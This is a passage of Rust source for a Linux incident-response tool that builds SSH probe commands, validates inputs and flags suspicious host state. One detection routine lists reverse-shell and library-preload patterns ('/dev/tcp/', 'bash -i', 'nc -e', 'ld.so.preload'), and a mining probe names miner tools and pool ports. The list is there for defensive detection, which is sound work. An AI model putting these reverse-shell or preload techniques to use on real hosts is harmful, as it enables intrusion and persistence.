            "awk '/^(voluntary_ctxt_switches|nonvoluntary_ctxt_switches):/' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::OomScore => {
            "printf 'oom_score\\t%s\\n' \"$(cat \"/proc/$p/oom_score\" 2>/dev/null)\"; \
            printf 'oom_score_adj\\t%s\\n' \"$(cat \"/proc/$p/oom_score_adj\" 2>/dev/null)\" "
        }
        ProcessInvestigationAction::Scheduler => {
            "ps -p \"$p\" -o pid=,pri=,ni=,rtprio=,sched=,stat=,wchan:32=,args= 2>/dev/null"
        }
        ProcessInvestigationAction::SyscallSnapshot => {
            "if command -v timeout >/dev/null 2>&1 && command -v strace >/dev/null 2>&1; then timeout -s INT 5 strace -qq -c -p \"$p\" 2>&1; code=$?; [ \"$code\" -eq 124 ] || [ \"$code\" -eq 130 ] || exit \"$code\"; else printf 'strace 或 timeout 不可用\\n'; fi"
        }
        ProcessInvestigationAction::KernelStack => "head -n 100 \"/proc/$p/stack\" 2>/dev/null",
        ProcessInvestigationAction::FileDescriptorStats => {
            "printf 'Open file descriptors: %s\\n' \"$(find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 2>/dev/null | wc -l)\"; awk '/Max open files/{print}' \"/proc/$p/limits\" 2>/dev/null"
        }
        ProcessInvestigationAction::Signals => {
            "awk '/^(Sig|Shd)/{print}' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::Namespaces => "ls -l \"/proc/$p/ns\" 2>/dev/null",
        ProcessInvestigationAction::Cgroup => "cat \"/proc/$p/cgroup\" 2>/dev/null",
        ProcessInvestigationAction::Container => {
            "printf 'cgroup\\n'; cat \"/proc/$p/cgroup\" 2>/dev/null; printf '\\nmountinfo indicators\\n'; grep -E 'docker|containerd|kubepods|lxc|libpod' \"/proc/$p/mountinfo\" 2>/dev/null | head -n 50"
        }
        ProcessInvestigationAction::Uptime => "ps -p \"$p\" -o lstart=,etimes= 2>/dev/null",
        ProcessInvestigationAction::SuspiciousPath => {
            "exe=$(readlink \"/proc/$p/exe\" 2>/dev/null); cwd=$(readlink \"/proc/$p/cwd\" 2>/dev/null); printf 'Executable\\t%s\\nWorking directory\\t%s\\n' \"$exe\" \"$cwd\"; case \"$exe\" in /tmp/*|/dev/shm/*|/var/tmp/*) printf 'Executable risk\\tsuspicious-path\\n';; *) printf 'Executable risk\\tnormal-path\\n';; esac; case \"$cwd\" in /tmp/*|/dev/shm/*|/var/tmp/*) printf 'Working directory risk\\tsuspicious-path\\n';; *) printf 'Working directory risk\\tnormal-path\\n';; esac"
        }
        ProcessInvestigationAction::HiddenProcess => {
            "if ps -p \"$p\" >/dev/null 2>&1; then printf 'ps visibility\\tvisible\\n'; else printf 'ps visibility\\tnot-visible\\n'; fi; if [ -d \"/proc/$p\" ]; then printf 'proc visibility\\tpresent\\n'; else printf 'proc visibility\\tabsent\\n'; fi"
        }
        ProcessInvestigationAction::LdPreload => {
            "tr '\\0' '\\n' < \"/proc/$p/environ\" 2>/dev/null | grep -E '^(LD_PRELOAD|LD_LIBRARY_PATH)=' || printf 'No LD_PRELOAD or LD_LIBRARY_PATH in process environment\\n'"
        }
        ProcessInvestigationAction::DeletedExecutable => {
            "exe=$(readlink \"/proc/$p/exe\" 2>/dev/null); printf '%s\\n' \"$exe\"; case \"$exe\" in *' (deleted)') printf 'Result\\tdeleted executable\\n';; *) printf 'Result\\texecutable present\\n';; esac"
        }
        ProcessInvestigationAction::SuspiciousNetwork => {
            "ss -H -tnp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100"
        }
        ProcessInvestigationAction::CryptoMining => {
            "printf 'Command indicators\\n'; tr '\\0' ' ' < \"/proc/$p/cmdline\" 2>/dev/null | grep -Eio 'xmrig|minerd|cpuminer|stratum|cryptonight|mining' | sort -u || true; printf '\\nPool-port connections\\n'; ss -H -tnp 2>/dev/null | grep -F \"pid=$p,\" | grep -E ':(3333|4444|5555|14444)([[:space:]]|$)' | head -n 100 || true; printf '\\nCPU\\n'; ps -p \"$p\" -o pcpu=,pmem=,args= 2>/dev/null"
        }
    };
    format!("p={pid}; [ -d \"/proc/$p\" ] || exit 44; {probe}")
}

fn parse_detail(request: &SystemInfoDetailRequest, output: &str) -> SystemInfoDetail {
    let fields = output
        .lines()
        .filter_map(|line| line.split_once('\t'))
        .take(64)
        .map(|(label, value)| SystemInfoDetailField {
            label: bounded_text(label, 128),
            value: bounded_text(value, MAX_CELL_CHARS),
        })
        .collect();
    SystemInfoDetail {
        tab: request.tab,
        row_id: request.row_id.clone(),
        fields,
    }
}

/// Written into the message of a system-information command failure when the
/// target never answered, so a caller can tell that apart from a target that
/// answered with a refusal.
///
/// The two are different things to say to an operator: one means the row moved
/// on, the other means the host is not keeping up. Reported as the same thing,
/// a host that is merely slow reads as a host whose state changed under you.
pub const COMMAND_TIMEOUT_MARKER: &str = "timed_out=true";

fn command_failed(subject: &'static str, output: &crate::ssh::SshCommandOutput) -> CoreError {
    CoreError::Validation {
        subject: "system information command",
        message: format!(
            "{subject} failed (exit={:?}, timed_out={})",
            output.exit_code, output.timed_out
        ),
    }
}

fn parse_summary(output: &str) -> CoreResult<SystemInfoSummary> {
    let values: BTreeMap<_, _> = output
        .lines()
        .filter_map(|line| line.split_once('\t'))
        .map(|(key, value)| (key, bounded_text(value, MAX_SUMMARY_CHARS)))
        .collect();
    let get = |key: &str| values.get(key).cloned().unwrap_or_default();
    if get("hostname").is_empty() {
        return Err(CoreError::Validation {
            subject: "system summary output",
            message: "missing hostname marker".to_owned(),
        });
    }
    let loads: Vec<_> = get("load")
        .split_whitespace()
        .take(3)
        .map(ToOwned::to_owned)
        .collect();
    Ok(SystemInfoSummary {
        hostname: get("hostname"),
        operating_system: get("os"),
        kernel: get("kernel"),
        architecture: get("architecture"),
        virtualization: get("virtualization"),
        boot_time: get("boot_time"),
        timezone: get("timezone"),
        locale: get("locale"),
        init_system: get("init_system"),
        package_manager: get("package_manager"),
        selinux: get("selinux"),
        apparmor: get("apparmor"),
        uptime_seconds: parse_first_u64(&get("uptime")),
        load_average: [
            loads.first().cloned().unwrap_or_else(|| "0".to_owned()),
            loads.get(1).cloned().unwrap_or_else(|| "0".to_owned()),
            loads.get(2).cloned().unwrap_or_else(|| "0".to_owned()),
        ],
        cpu_model: get("cpu_model"),
        cpu_cores: parse_first_u64(&get("cpu_cores")).try_into().unwrap_or(0),
        memory_total_bytes: parse_first_u64(&get("mem_total")),
        memory_available_bytes: parse_first_u64(&get("mem_available")),
        swap_total_bytes: parse_first_u64(&get("swap_total")),
        swap_free_bytes: parse_first_u64(&get("swap_free")),
        root_device: get("root_device"),
        root_filesystem: get("root_filesystem"),
        root_total_bytes: parse_first_u64(&get("root_total")),
        root_available_bytes: parse_first_u64(&get("root_available")),
        primary_ip: get("primary_ip"),
        default_gateway: get("default_gateway"),
        dns_servers: get("dns_servers"),
        process_count: parse_first_u64(&get("processes")).try_into().unwrap_or(0),
        logged_in_users: parse_first_u64(&get("users")).try_into().unwrap_or(0),
        network_connections: parse_first_u64(&get("connections")).try_into().unwrap_or(0),
        received_bytes: parse_first_u64(&get("rx")),
        transmitted_bytes: parse_first_u64(&get("tx")),
    })
}

fn parse_table(request: &SystemInfoRequest, output: &str) -> SystemInfoTable {
    let column_count = request.tab.columns().len();
    let mut rows = Vec::new();
    let mut duplicate_ids = BTreeMap::<String, usize>::new();
    let mut saw_extra = false;
    // The command says the tool is missing by printing the marker and nothing
    // else. "Nothing else" is the whole guard: a compromised host can print the
    // marker too, but if it also prints rules the rules are what count, so the
    // worst it can do is claim it has no tool while showing nothing — exactly
    // what it could already do by printing nothing at all.
    let mut lines = output.lines().filter(|line| !line.trim().is_empty());
    let alone = match (lines.next(), lines.next()) {
        (Some(first), None) => Some(first.trim()),
        _ => None,
    };
    let missing_tool = match alone {
        Some(NO_TOOL_MARKER) => request.tab.required_tool(),
        _ => None,
    };
    let failed_tool = match alone {
        Some(TOOL_FAILED_MARKER) => request.tab.required_tool(),
        _ => None,
    };
    for line in output.lines().filter(|line| !line.is_empty()) {
        if rows.len() == request.maximum_rows {
            saw_extra = true;
            break;
        }
        let mut cells: Vec<_> = line
            .splitn(column_count, '\t')
            .map(|cell| bounded_text(cell, MAX_CELL_CHARS))
            .collect();
        cells.resize(column_count, String::new());
        let risk = stronger_risk(infer_risk(&cells), tab_risk(request.tab, &cells));
        let base_id = stable_row_id(request.tab, &cells);
        let duplicate = duplicate_ids.entry(base_id.clone()).or_default();
        let id = format!("{base_id}-{duplicate}");
        *duplicate += 1;
        rows.push(SystemInfoRow { id, cells, risk });
    }
    SystemInfoTable {
        tab: request.tab,
        columns: request
            .tab
            .columns()
            .iter()
            .map(|column| (*column).to_owned())
            .collect(),
        rows: if missing_tool.is_some() || failed_tool.is_some() {
            Vec::new()
        } else {
            rows
        },
        truncated: saw_extra && missing_tool.is_none() && failed_tool.is_none(),
        missing_tool,
        failed_tool,
    }
}

fn stable_row_id(tab: SystemInfoTab, cells: &[String]) -> String {
    let mut digest = Sha256::new();
    digest.update(tab_id(tab).as_bytes());
    for index in primary_key_columns(tab) {
        digest.update([0]);
        if let Some(cell) = cells.get(*index) {
            digest.update(cell.as_bytes());
        }
    }
    let digest = format!("{:x}", digest.finalize());
    format!("{}-{}", tab_id(tab), &digest[..24])
}

fn invalid_detail_key(subject: &'static str) -> CoreError {
    CoreError::Validation {
        subject: "system information detail identity",
        message: format!("invalid {subject}"),
    }
}

fn is_valid_unit_name(value: &str) -> bool {
    value
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        && value.len() <= 256
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'@' | b':')
        })
}

fn is_valid_ssh_key_type(value: &str) -> bool {
    matches!(
        value,
        "ssh-rsa"
            | "ssh-ed25519"
            | "ecdsa-sha2-nistp256"
            | "ecdsa-sha2-nistp384"
            | "ecdsa-sha2-nistp521"
            | "sk-ssh-ed25519@openssh.com"
            | "sk-ecdsa-sha2-nistp256@openssh.com"
    )
}

fn is_valid_ssh_key_content(value: &str) -> bool {
    (16..=8_192).contains(&value.len())
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'='))
}

fn validated_absolute_path(value: &str) -> CoreResult<String> {
    if value.starts_with('/')
        && value.len() <= MAX_CELL_CHARS
        && !value.chars().any(char::is_control)
    {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("absolute path"))
    }
}

fn is_valid_package_name(value: &str) -> bool {
    value
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && value.len() <= 256
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'-' | b'.' | b':' | b'_')
        })
}

fn is_valid_module_name(value: &str) -> bool {
    value
        .bytes()
        .next()
        .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        && value.len() <= 128
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.'))
}

fn managed_module_policy_path(module: &str) -> CoreResult<RemotePath> {
    if !is_valid_module_name(module) {
        return Err(invalid_detail_key("kernel module name"));
    }
    RemotePath::new(format!("/etc/modprobe.d/lovelyres-blacklist-{module}.conf"))
}

fn managed_module_policy_content(module: &str) -> CoreResult<Vec<u8>> {
    if !is_valid_module_name(module) {
        return Err(invalid_detail_key("kernel module name"));
    }
    Ok(format!(
        "# Managed by LovelyRes; remove through LovelyRes to preserve audit history.\nblacklist {module}\n"
    )
    .into_bytes())
}

fn is_valid_environment_name(value: &str) -> bool {
    value.len() <= 128
        && value
            .bytes()
            .next()
            .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
}

fn is_valid_service_unit(value: &str) -> bool {
    value.ends_with(".service") && is_valid_unit_name(value)
}

/// The name a boot directory links a script under.
///
/// Kept to one path segment with no leading dot, because the name is also how
/// the script's configuration file is found — `/etc/default/<name>` and its
/// equivalents — and a name that could climb out of those directories would
/// turn a lookup into something else.
fn is_valid_init_script_name(value: &str) -> bool {
    (1..=128).contains(&value.len())
        && value
            .bytes()
            .next()
            .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'@'))
}

fn is_valid_timer_unit(value: &str) -> bool {
    value.ends_with(".timer") && is_valid_unit_name(value)
}

fn validated_username(value: &str) -> CoreResult<String> {
    if is_valid_username(value) {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("Linux username"))
    }
}

fn validated_inert_command(value: &str) -> CoreResult<String> {
    if !value.trim().is_empty()
        && value.len() <= MAX_CELL_CHARS
        && !value.chars().any(char::is_control)
    {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("inert command text"))
    }
}

fn validated_cron_schedule(value: &str) -> CoreResult<String> {
    let fields = value.split_ascii_whitespace().collect::<Vec<_>>();
    let safe = fields.len() == 5
        && value.len() <= 256
        && fields.iter().all(|field| {
            !field.is_empty()
                && field.len() <= 64
                && field.bytes().all(|byte| {
                    byte.is_ascii_alphanumeric() || matches!(byte, b'*' | b',' | b'-' | b'/')
                })
        });
    if safe {
        Ok(fields.join(" "))
    } else {
        Err(invalid_detail_key("cron schedule"))
    }
}

fn is_valid_safe_basename(value: &str) -> bool {
    !value.is_empty()
        && value != "."
        && value != ".."
        && value.len() <= 128
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.'))
}

fn validated_cron_source(value: &str) -> CoreResult<String> {
    let valid = value == "/etc/crontab"
        || value
            .strip_prefix("/etc/cron.d/")
            .is_some_and(is_valid_safe_basename);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("cron source file"))
    }
}

fn validated_deletable_cron_path(value: &str) -> CoreResult<RemotePath> {
    let basename = value
        .strip_prefix("/etc/cron.d/")
        .filter(|basename| is_valid_safe_basename(basename))
        .ok_or_else(|| {
            CoreError::validation(
                "cron file mutation",
                "only validated independent files directly below /etc/cron.d may be removed",
            )
        })?;
    if basename.starts_with('.') {
        return Err(CoreError::validation(
            "cron file mutation",
            "hidden cron files are outside the managed inventory",
        ));
    }
    RemotePath::new(value)
}

fn validated_shell_config_path(value: &str) -> CoreResult<String> {
    let valid = matches!(value, "/etc/profile" | "/etc/bash.bashrc" | "/root/.bashrc")
        || value
            .strip_prefix("/home/")
            .and_then(|suffix| suffix.strip_suffix("/.bashrc"))
            .is_some_and(is_valid_username);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("shell configuration path"))
    }
}

fn validated_line_number(value: &str) -> CoreResult<u32> {
    value
        .parse::<u32>()
        .ok()
        .filter(|line| (1..=10_000_000).contains(line))
        .ok_or_else(|| invalid_detail_key("line number"))
}

fn validated_shell_line(value: &str) -> CoreResult<String> {
    if !value.is_empty()
        && value.len() <= MAX_CELL_CHARS
        && !value.chars().any(|character| character.is_control())
    {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("shell configuration content"))
    }
}

fn validated_octal_mode(value: &str) -> CoreResult<u32> {
    if !(1..=4).contains(&value.len()) || !value.bytes().all(|byte| matches!(byte, b'0'..=b'7')) {
        return Err(invalid_detail_key("octal file mode"));
    }
    u32::from_str_radix(value, 8).map_err(|_| invalid_detail_key("octal file mode"))
}

fn validated_suid_path(value: &str) -> CoreResult<RemotePath> {
    let path = RemotePath::new(value)?;
    let allowed = [
        "/bin/",
        "/sbin/",
        "/usr/bin/",
        "/usr/sbin/",
        "/usr/local/bin/",
    ];
    if allowed.iter().any(|prefix| value.starts_with(prefix)) {
        Ok(path)
    } else {
        Err(CoreError::validation(
            "SUID file mutation",
            "path is outside the collected executable roots",
        ))
    }
}

fn comment_shell_line(
    content: &[u8],
    line_number: u32,
    displayed_content: &str,
) -> CoreResult<Vec<u8>> {
    let text = std::str::from_utf8(content).map_err(|error| {
        CoreError::validation(
            "shell configuration mutation",
            format!("configuration must be UTF-8 text: {error}"),
        )
    })?;
    let line_index = usize::try_from(line_number.saturating_sub(1)).map_err(|_| {
        CoreError::validation(
            "shell configuration mutation",
            "line number is out of range",
        )
    })?;
    let mut replacement = Vec::with_capacity(content.len().saturating_add(32));
    let mut found = false;
    for (index, line) in text.split_inclusive('\n').enumerate() {
        if index != line_index {
            replacement.extend_from_slice(line.as_bytes());
            continue;
        }
        let body = line
            .strip_suffix('\n')
            .unwrap_or(line)
            .strip_suffix('\r')
            .unwrap_or_else(|| line.strip_suffix('\n').unwrap_or(line));
        if body.replace('\t', " ") != displayed_content {
            return Err(CoreError::validation(
                "shell configuration mutation",
                "the selected line changed after the inventory row was collected",
            ));
        }
        if body.trim_start().starts_with('#') {
            return Err(CoreError::validation(
                "shell configuration mutation",
                "the selected line is already a comment",
            ));
        }
        replacement.extend_from_slice(b"# LovelyHawk disabled: ");
        replacement.extend_from_slice(line.as_bytes());
        found = true;
    }
    if !found {
        return Err(CoreError::validation(
            "shell configuration mutation",
            "the selected line no longer exists",
        ));
    }
    if replacement.len() as u64 > MAX_EDIT_BYTES {
        return Err(CoreError::validation(
            "shell configuration mutation",
            format!("replacement exceeds the {MAX_EDIT_BYTES}-byte managed edit limit"),
        ));
    }
    Ok(replacement)
}

fn validated_sudo_principal(value: &str) -> CoreResult<String> {
    let valid = !value.is_empty()
        && value.len() <= 128
        && !value.starts_with('-')
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric()
                || matches!(byte, b'_' | b'-' | b'.' | b'%' | b'@' | b'+' | b'#' | b':')
        });
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("sudoers principal"))
    }
}

fn validated_sudoers_source(value: &str) -> CoreResult<String> {
    let valid = value == "/etc/sudoers"
        || value
            .strip_prefix("/etc/sudoers.d/")
            .is_some_and(is_valid_safe_basename);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("sudoers source file"))
    }
}

fn validated_authorized_keys_path(value: &str) -> CoreResult<String> {
    let valid = value == "/root/.ssh/authorized_keys"
        || value
            .strip_prefix("/home/")
            .and_then(|suffix| suffix.strip_suffix("/.ssh/authorized_keys"))
            .is_some_and(is_valid_username);
    if valid {
        Ok(value.to_owned())
    } else {
        Err(invalid_detail_key("authorized_keys path"))
    }
}

fn file_detail_command(path: &str) -> String {
    let path = shq(path);
    format!(
        "p={path}; printf 'Canonical Path\\t%s\\n' \"$(readlink -f -- \"$p\" 2>/dev/null)\"; \
printf 'File Type\\t%s\\n' \"$(file -b -- \"$p\" 2>/dev/null)\"; \
printf 'Owner\\t%s\\n' \"$(stat -c '%U (%u)' -- \"$p\" 2>/dev/null)\"; \
printf 'Group\\t%s\\n' \"$(stat -c '%G (%g)' -- \"$p\" 2>/dev/null)\"; \
printf 'Mode\\t%s\\n' \"$(stat -c '%A (%a)' -- \"$p\" 2>/dev/null)\"; \
printf 'Size Bytes\\t%s\\n' \"$(stat -c '%s' -- \"$p\" 2>/dev/null)\"; \
printf 'Modified\\t%s\\n' \"$(stat -c '%y' -- \"$p\" 2>/dev/null)\"; \
printf 'SHA256\\t%s\\n' \"$(sha256sum -- \"$p\" 2>/dev/null | awk '{{print $1}}')\"; \
printf 'Capabilities\\t%s\\n' \"$(getcap -n -- \"$p\" 2>/dev/null | cut -d' ' -f2-)\" "
    )
}

const fn primary_key_columns(tab: SystemInfoTab) -> &'static [usize] {
    match tab {
        SystemInfoTab::Processes => &[1],
        SystemInfoTab::Network => &[0, 1, 2, 4],
        SystemInfoTab::Services => &[0],
        SystemInfoTab::Established => &[0, 1, 2, 3, 4],
        SystemInfoTab::OpenPorts => &[0, 1, 2, 3],
        SystemInfoTab::Users => &[0, 1],
        SystemInfoTab::Autostart => &[0],
        SystemInfoTab::Cron => &[0, 1, 2, 3],
        SystemInfoTab::SshKeys => &[0, 1, 2, 4],
        SystemInfoTab::LoginHistory => &[0, 1, 2, 3],
        SystemInfoTab::SuidFiles => &[0],
        SystemInfoTab::Autoruns => &[0, 1, 3],
        SystemInfoTab::Firewall => &[0, 1, 2, 3, 4, 5],
        SystemInfoTab::EnvVars => &[0],
        SystemInfoTab::ShellConfigs => &[0, 3],
        SystemInfoTab::Packages => &[0],
        SystemInfoTab::Sudoers => &[0, 1, 2, 4],
        SystemInfoTab::Timers => &[0],
        SystemInfoTab::KernelModules => &[0],
        SystemInfoTab::Rootcheck => &[0],
        SystemInfoTab::Sensitive => &[0],
        SystemInfoTab::RecentFiles => &[0],
        SystemInfoTab::Docker => &[0],
        SystemInfoTab::Kubernetes => &[0, 1],
        SystemInfoTab::WebApps => &[0, 1],
    }
}

/// Whether something is fetched and then handed straight to a shell.
///
/// Split on the pipe and look at the first word after it, so that `| sh &`
/// counts and `| sha256sum` does not.
fn pipes_into_a_shell(text: &str) -> bool {
    const SHELLS: [&str; 3] = ["sh", "bash", "zsh"];
    text.split('|').skip(1).any(|segment| {
        let word = segment.trim_start();
        SHELLS.iter().any(|shell| {
            word.strip_prefix(shell).is_some_and(|rest| {
                rest.is_empty() || rest.starts_with([' ', '&', ';', '>', '\t', ')', '\'', '"'])
            })
        })
    })
}

/// The shapes worth marking wherever they turn up, whatever the tab.
///
/// The word rules below only notice a risk the collecting command already
/// named, which serves the few tabs that emit a risk column and does nothing
/// for the rest. A boot script that opens a shell back to an address is the
/// one row 启动项汇总 exists to surface, and it went out unmarked among
/// fourteen ordinary ones — which is the same as not collecting it.
fn hostile_shape(text: &str) -> Option<SystemInfoRisk> {
    const CERTAIN: [&str; 6] = [
        // A shell with its input and output redirected to a socket.
        "/dev/tcp/",
        // An interactive shell where there is nobody to be interactive with.
        "bash -i",
        "nc -e",
        "ncat -e",
        // A library forced into every process that starts.
        "ld.so.preload",
        "ld_preload=",
    ];
    if CERTAIN.iter().any(|needle| text.contains(needle)) {
        return Some(SystemInfoRisk::High);
    }
    if pipes_into_a_shell(text) || text.contains("setsid ") || text.contains("chattr +i") {
        return Some(SystemInfoRisk::Warning);
    }
    None
}

/// Whether a cell *is* one of these words, rather than merely containing one.
///
/// The generic state words are only meaningful when the collecting command put
/// them in a column of their own. Matched anywhere in the row they also fire on
/// prose — a login script commenting `# colored GCC warnings and errors` came
/// back marked, and two false marks in three hundred lines is how an operator
/// learns to stop reading the marks.
fn a_cell_says(cells: &[String], words: &[&str]) -> bool {
    cells.iter().any(|cell| {
        let value = cell.trim().to_lowercase();
        words.contains(&value.as_str())
    })
}

/// What a row means in its own table, beyond the words in it.
///
/// `infer_risk` reads text, and a backdoor account has none to read: a line
/// `sys-update 0 0 /var/tmp /bin/sh` says nothing alarming. What gives it away
/// is a column — a second account with UID 0 is root under another name. GID 0
/// alone is not marked: several distributions ship `sync`, `shutdown` and
/// `halt` in group 0.
fn tab_risk(tab: SystemInfoTab, cells: &[String]) -> SystemInfoRisk {
    match tab {
        SystemInfoTab::Users
            if cells.get(1).map(|uid| uid.trim()) == Some("0")
                && cells.first().map(|name| name.trim()) != Some("root") =>
        {
            SystemInfoRisk::High
        }
        _ => SystemInfoRisk::Normal,
    }
}

const fn stronger_risk(left: SystemInfoRisk, right: SystemInfoRisk) -> SystemInfoRisk {
    match (left, right) {
        (SystemInfoRisk::High, _) | (_, SystemInfoRisk::High) => SystemInfoRisk::High,
        (SystemInfoRisk::Warning, _) | (_, SystemInfoRisk::Warning) => SystemInfoRisk::Warning,
        _ => SystemInfoRisk::Normal,
    }
}

fn infer_risk(cells: &[String]) -> SystemInfoRisk {
    let text = cells.join(" ").to_lowercase();
    // These are specific enough that finding them anywhere means something:
    // no ordinary line says NOPASSWD by accident.
    let named_high = ["malicious", "backdoor", "高危", "危险"];
    let named_warning = ["nopasswd", "可疑", "异常", "失败"];
    if a_cell_says(cells, &["high", "critical"]) || named_high.iter().any(|w| text.contains(w)) {
        SystemInfoRisk::High
    } else if let Some(risk) = hostile_shape(&text) {
        risk
    } else if a_cell_says(cells, &["warning", "suspicious", "failed"])
        || named_warning.iter().any(|w| text.contains(w))
    {
        SystemInfoRisk::Warning
    } else {
        SystemInfoRisk::Normal
    }
}

fn bounded_text(value: &str, maximum_chars: usize) -> String {
    value
        .chars()
        .map(|character| {
            if character == '\t' || character.is_control() {
                ' '
            } else {
                character
            }
        })
        .take(maximum_chars)
        .collect()
}

fn parse_first_u64(value: &str) -> u64 {
    value
        .split_whitespace()
        .next()
        .and_then(|value| value.parse().ok())
        .unwrap_or(0)
}

const fn tab_id(tab: SystemInfoTab) -> &'static str {
    match tab {
        SystemInfoTab::Processes => "processes",
        SystemInfoTab::Network => "network",
        SystemInfoTab::Services => "services",
        SystemInfoTab::Established => "established",
        SystemInfoTab::OpenPorts => "openports",
        SystemInfoTab::Users => "users",
        SystemInfoTab::Autostart => "autostart",
        SystemInfoTab::Cron => "cron",
        SystemInfoTab::SshKeys => "sshkeys",
        SystemInfoTab::LoginHistory => "loginhistory",
        SystemInfoTab::SuidFiles => "suidfiles",
        SystemInfoTab::Autoruns => "autoruns",
        SystemInfoTab::Firewall => "firewall",
        SystemInfoTab::EnvVars => "envvars",
        SystemInfoTab::ShellConfigs => "shellconfigs",
        SystemInfoTab::Packages => "packages",
        SystemInfoTab::Sudoers => "sudoers",
        SystemInfoTab::Timers => "timers",
        SystemInfoTab::KernelModules => "kernelmodules",
        SystemInfoTab::Rootcheck => "rootcheck",
        SystemInfoTab::Sensitive => "sensitive",
        SystemInfoTab::RecentFiles => "recentfiles",
        SystemInfoTab::Docker => "docker",
        SystemInfoTab::Kubernetes => "kubernetes",
        SystemInfoTab::WebApps => "webapps",
    }
}

const SUMMARY_COMMAND: &str = r#"printf 'hostname\t%s\n' "$(hostname 2>/dev/null | head -n 1)"
printf 'os\t%s\n' "$(sed -n 's/^PRETTY_NAME=//p' /etc/os-release 2>/dev/null | head -n 1 | tr -d '"')"
printf 'kernel\t%s\n' "$(uname -srmo 2>/dev/null | head -n 1)"
printf 'architecture\t%s\n' "$(uname -m 2>/dev/null | head -n 1)"
printf 'virtualization\t%s\n' "$(v=$(systemd-detect-virt 2>/dev/null || true); printf '%s' "${v:-physical-or-unknown}")"
printf 'boot_time\t%s\n' "$( (uptime -s 2>/dev/null || who -b 2>/dev/null | awk '{$1="";$2="";sub(/^  */,"");print}') | head -n 1)"
printf 'timezone\t%s\n' "$(z=$(timedatectl show -p Timezone --value 2>/dev/null || true); [ -n "$z" ] || z=$(date +%Z 2>/dev/null); printf '%s' "$z")"
printf 'locale\t%s\n' "${LANG:-unknown}"
printf 'init_system\t%s\n' "$(readlink -f /proc/1/exe 2>/dev/null | awk -F/ '{print $NF}')"
printf 'package_manager\t%s\n' "$(for p in apt-get dnf yum zypper pacman apk rpm dpkg; do command -v "$p" >/dev/null 2>&1 && { printf '%s' "$p"; break; }; done)"
printf 'selinux\t%s\n' "$(if command -v getenforce >/dev/null 2>&1; then getenforce 2>/dev/null; else printf 'unavailable'; fi)"
printf 'apparmor\t%s\n' "$(if command -v aa-status >/dev/null 2>&1; then aa-status --enabled >/dev/null 2>&1 && printf 'enabled' || printf 'disabled'; elif [ -d /sys/module/apparmor ]; then printf 'present'; else printf 'unavailable'; fi)"
printf 'uptime\t%s\n' "$(awk '{print int($1)}' /proc/uptime 2>/dev/null)"
printf 'load\t%s\n' "$(awk '{print $1" "$2" "$3}' /proc/loadavg 2>/dev/null)"
printf 'cpu_model\t%s\n' "$(sed -n 's/^model name[[:space:]]*:[[:space:]]*//p' /proc/cpuinfo 2>/dev/null | head -n 1)"
printf 'cpu_cores\t%s\n' "$( (command -v nproc >/dev/null 2>&1 && nproc) || grep -c '^processor' /proc/cpuinfo 2>/dev/null)"
awk '/^MemTotal:/{t=$2*1024}/^MemAvailable:/{a=$2*1024}/^SwapTotal:/{st=$2*1024}/^SwapFree:/{sf=$2*1024} END{printf "mem_total\t%.0f\nmem_available\t%.0f\nswap_total\t%.0f\nswap_free\t%.0f\n",t,a,st,sf}' /proc/meminfo 2>/dev/null
df -B1 -PT / 2>/dev/null | awk 'NR==2{print "root_device\t"$1"\nroot_filesystem\t"$2"\nroot_total\t"$3"\nroot_available\t"$5}'
printf 'primary_ip\t%s\n' "$(hostname -I 2>/dev/null | awk '{print $1}')"
printf 'default_gateway\t%s\n' "$(ip route show default 2>/dev/null | awk 'NR==1{print $3}')"
printf 'dns_servers\t%s\n' "$(awk '/^nameserver[[:space:]]+/{print $2}' /etc/resolv.conf 2>/dev/null | paste -sd ',' -)"
printf 'processes\t%s\n' "$(ps -e --no-headers 2>/dev/null | wc -l)"
printf 'users\t%s\n' "$(who 2>/dev/null | wc -l)"
printf 'connections\t%s\n' "$( (ss -H -tun 2>/dev/null || netstat -tun 2>/dev/null | tail -n +3) | wc -l)"
awk -F'[: ]+' 'NR>2 && $1!="lo"{rx+=$3;tx+=$11} END{printf "rx\t%.0f\ntx\t%.0f\n",rx,tx}' /proc/net/dev 2>/dev/null"#;

/// Processes that run come before the ones that exited and were never reaped
/// (state Z), each in PID order, so the 500 rows show what is actually running
/// on a host with a zombie flood rather than a page of `<defunct>`.
/// The process table: procps `ps` where it exists, `/proc` read directly where
/// it does not.
///
/// BusyBox `ps` (Alpine, most small images) has no `pcpu`, `pmem`, `etimes` or
/// `--no-headers`, so the procps form fails there, and with its error sent to
/// /dev/null the tab used to come back empty and say the machine had no
/// processes — on exactly the kind of minimal host an intruder likes. The
/// fallback reads the same eight fields from /proc: %CPU as procps defines it
/// (CPU time over elapsed time), %MEM from resident pages over MemTotal,
